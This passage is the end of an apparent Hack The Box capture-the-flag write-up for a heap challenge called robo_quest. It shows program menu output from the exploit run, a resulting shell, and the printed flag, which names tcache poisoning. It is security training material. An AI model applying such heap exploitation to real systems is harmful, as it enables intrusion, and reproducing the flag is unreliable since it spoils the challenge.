b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [6] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
b' [+] Question [5] has been removed.\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's size:"
b' [*] Insert question here:'
b' \x1b[1;36m\n[+] Question has been created!\n\x1b[0m\n\x1b[1;31m\n1. Create\n2. Show\n3. Modify\n4. Remove'
b"\n> \x1b[0m\n[*] Question's id:"
[*] Switching to interactive mode
 $ ls
flag.txt  robo_quest
$ cat flag.txt
HTB{r0b0fl0w_tc4ch3_p01s0n}    
```
Thanks for reading!
